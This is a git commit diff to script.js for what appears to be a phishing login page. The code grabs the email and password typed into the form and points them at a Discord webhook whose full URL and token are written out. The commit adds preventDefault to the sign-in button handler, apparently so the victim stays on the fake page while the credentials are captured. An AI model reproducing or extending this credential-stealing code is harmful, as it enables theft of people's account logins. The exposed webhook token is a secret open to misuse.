90979c795b66c4b5143156072d841257454babfc
reddragonroom <ronlara00@gmail.com>
2025-09-27 01:43:37 +0500

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,8 @@ const email = document.querySelector("input[type='email']");
 const password = document.querySelector("input[type='password']");
 const loginButton = document.querySelector("#sign-in-btn");
 
-loginButton.addEventListener("click", () => {
+loginButton.addEventListener("click", (e) => {
+  e.preventDefault();
   const content = { email: email.value, password: password.value };
   const webhookURL =
     "https://discord.com/api/webhooks/1421198194758647906/jCx6wDN8iYUuOr4Od7yPTxr6BWcqLgnb89J6A4DV-fWNbi2OOLhklkcaOLsrjkqTt5KG";
